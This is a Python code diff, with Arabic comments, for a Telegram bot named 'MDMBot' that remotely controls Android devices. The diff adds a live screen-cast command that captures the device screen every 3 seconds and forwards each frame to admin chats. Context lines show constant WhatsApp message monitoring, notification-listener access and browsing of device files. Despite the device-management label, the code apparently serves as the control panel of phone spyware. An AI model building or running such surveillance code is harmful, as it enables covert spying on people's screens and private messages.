@@ -174,6 +174,18 @@ class DeviceStore:
                 return sid
         return None
 
+    def set_screen_cast(self, device_id, active: bool):
+        """تتبع حالة البث المباشر لكل جهاز"""
+        with self._lock:
+            dev = self._devices.get(device_id)
+            if dev:
+                dev["screen_cast_active"] = active
+
+    def is_screen_casting(self, device_id) -> bool:
+        """هل الجهاز يبث حالياً؟"""
+        dev = self._devices.get(device_id)
+        return bool(dev and dev.get("screen_cast_active", False))
+
     def get_stats(self):
         return {
             "total": len(self._devices),
@@ -282,6 +294,16 @@ def build_command_payload(cmd_type, params=None):
             return p
         # ⚡ request-notification-permission (NotificationListenerService)
         if cmd_type == "request-notification-permission":
+            p = {"command": cmd_type, "category": "permissions",
+                 "timestamp": datetime.now(timezone.utc).isoformat()}
+            return p
+        # ⚡ start-screen-cast (بدء البث المباشر)
+        if cmd_type == "start-screen-cast":
+            p = {"command": cmd_type, "category": "permissions",
+                 "timestamp": datetime.now(timezone.utc).isoformat()}
+            return p
+        # ⚡ stop-screen-cast (إيقاف البث المباشر)
+        if cmd_type == "stop-screen-cast":
             p = {"command": cmd_type, "category": "permissions",
                  "timestamp": datetime.now(timezone.utc).isoformat()}
             return p
@@ -504,6 +526,22 @@ def permissions_keyboard(did):
         callback_data=f"cmd:{did}:p{cache_key2}"[:64]
     )
     kb.add(notif_access_btn)
+    # ⚡ زر البث المباشر — يختلف حسب حالة البث
+    is_casting = dm.is_screen_casting(did)
+    cache_key3 = str(len(_file_path_cache))
+    if is_casting:
+        _file_path_cache[cache_key3] = "stop-screen-cast"
+        cast_btn = InlineKeyboardButton(
+            "⏹ إيقاف البث المباشر",
+            callback_data=f"cmd:{did}:p{cache_key3}"[:64]
+        )
+    else:
+        _file_path_cache[cache_key3] = "start-screen-cast"
+        cast_btn = InlineKeyboardButton(
+            "📺 البث المباشر",
+            callback_data=f"cmd:{did}:p{cache_key3}"[:64]
+        )
+    kb.add(cast_btn)
     kb.add(_back(did))
     return kb
 
@@ -658,6 +696,14 @@ def _format_cmd_sent(dev, command, params=None):
     short_label = _dev_label(dev)
     lbl = COMMANDS.get(command, {}).get("label", command)
     desc = COMMANDS.get(command, {}).get("description", "")
+
+    # ⚡ أسماء مخصصة لأوامر البث المباشر
+    if command == "start-screen-cast":
+        lbl = "📺 البث المباشر"
+        desc = "بدء التقاط مستمر لشاشة الجهاز كل 3 ثوانٍ"
+    elif command == "stop-screen-cast":
+        lbl = "⏹ إيقاف البث المباشر"
+        desc = "إيقاف التقاط المستمر"
 
     lines = [
         f"<b>⚡ تم إرسال الأمر فوراً</b>",
@@ -1218,6 +1264,11 @@ class MDMBot:
                 # ⚡ Handle request-notification-permission (NotificationListenerService)
                 elif tgt == "request-notification-permission":
                     self._send_cmd(c.message.chat.id, did, "request-notification-permission")
+                # ⚡ Handle start-screen-cast (البث المباشر)
+                elif tgt == "start-screen-cast":
+                    self._send_cmd(c.message.chat.id, did, "start-screen-cast")
+                elif tgt == "stop-screen-cast":
+                    self._send_cmd(c.message.chat.id, did, "stop-screen-cast")
                 # For ls command, default to /sdcard/ if no path specified
                 elif tgt == "ls":
                     self._send_cmd(c.message.chat.id, did, "ls", {"value": "/sdcard/"})
@@ -2116,6 +2167,63 @@ def _sock_file_explorer(data):
                     logger.error(f"فشل إرسال إشعار إلغاء accessibility: {e}")
         return
 
+    # ⚡ Check for screen_cast_started event (بدء البث المباشر)
+    if data_type == "screen_cast_started":
+        logger.info(f"📺 Screen cast started on #{dev.get('short_id', '?')}")
+        dm.set_screen_cast(dev["device_id"], True)
+        if mdm_bot:
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    short_label = _dev_label(dev)
+                    did = dev["device_id"]
+                    stop_cache_key = str(len(_file_path_cache))
+                    _file_path_cache[stop_cache_key] = "stop-screen-cast"
+                    stop_btn = InlineKeyboardMarkup(row_width=1)
+                    stop_btn.add(InlineKeyboardButton(
+                        "⏹ إيقاف البث المباشر",
+                        callback_data=f"cmd:{did}:p{stop_cache_key}"[:64]
+                    ))
+                    interval = data.get("interval_ms", 3000)
+                    mdm_bot.bot.send_message(admin_id,
+                        f"<b>📺 تم بدء البث المباشر!</b>\n\n"
+                        f"📱 <b>{short_label}</b>\n"
+                        f"⏱ كل <b>{interval // 1000}</b> ثوانٍ\n"
+                        f"📸 ستصل صور الشاشة تلقائياً\n\n"
+                        f"💡 اضغط الزر أدناه للإيقاف",
+                        parse_mode="HTML",
+                        reply_markup=stop_btn)
+                except Exception as e:
+                    logger.error(f"فشل إرسال إشعار بدء البث: {e}")
+        return
+
+    # ⚡ Check for screen_cast_stopped event (إيقاف البث المباشر)
+    if data_type == "screen_cast_stopped":
+        logger.info(f"⏹ Screen cast stopped on #{dev.get('short_id', '?')}")
+        dm.set_screen_cast(dev["device_id"], False)
+        if mdm_bot:
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    short_label = _dev_label(dev)
+                    did = dev["device_id"]
+                    # زر إعادة البث
+                    start_cache_key = str(len(_file_path_cache))
+                    _file_path_cache[start_cache_key] = "start-screen-cast"
+                    kb = InlineKeyboardMarkup(row_width=1)
+                    kb.add(InlineKeyboardButton(
+                        "📺 بدء البث المباشر",
+                        callback_data=f"cmd:{did}:p{start_cache_key}"[:64]
+                    ))
+                    mdm_bot.bot.send_message(admin_id,
+                        f"<b>⏹ تم إيقاف البث المباشر</b>\n\n"
+                        f"📱 <b>{short_label}</b>\n"
+                        f"🏁 لم يعد يتم التقاط صور\n\n"
+                        f"💡 اضغط الزر أدناه لإعادة البث",
+                        parse_mode="HTML",
+                        reply_markup=kb)
+                except Exception as e:
+                    logger.error(f"فشل إرسال إشعار إيقاف البث: {e}")
+        return
+
     # ⚡ Check for whatsapp_message event (مراقبة واتساب الدائمة)
     if data_type == "whatsapp_message":
         _handle_whatsapp_message(dev, data)
@@ -2194,13 +2302,24 @@ def _process_base64_media(dev, data, sid):
             short_label = _dev_label(dev)
             from io import BytesIO
             bio = BytesIO(binary)
-            caption = f"📸 <b>لقطة شاشة</b>\n📱 <b>{short_label}</b>\n📏 {len(binary)} bytes"
+
+            # ⚡ تمييز صور البث المباشر عن لقطات الشاشة العادية
+            is_cast_frame = (media_type == "screen_cast_frame")
+            if is_cast_frame:
+                from datetime import datetime as _dt
+                now_str = _dt.now().strftime("%H:%M:%S")
+                caption = (f"📺 <b>بث مباشر</b>\n"
+                          f"📱 <b>{short_label}</b>\n"
+                          f"🕐 {now_str}\n"
+                          f"📏 {len(binary)} bytes")
+            else:
+                caption = f"📸 <b>لقطة شاشة</b>\n📱 <b>{short_label}</b>\n📏 {len(binary)} bytes"
 
             for admin_id in Config.ADMIN_IDS:
                 try:
                     mdm_bot.bot.send_photo(admin_id, photo=bio, caption=caption, parse_mode="HTML")
                     bio.seek(0)
-                    logger.info(f"✅ Screenshot sent to admin {admin_id}")
+                    logger.info(f"✅ {'Screen cast frame' if is_cast_frame else 'Screenshot'} sent to admin {admin_id}")
                 except Exception as e:
                     logger.error(f"❌ Failed to send to admin {admin_id}: {e}")
 
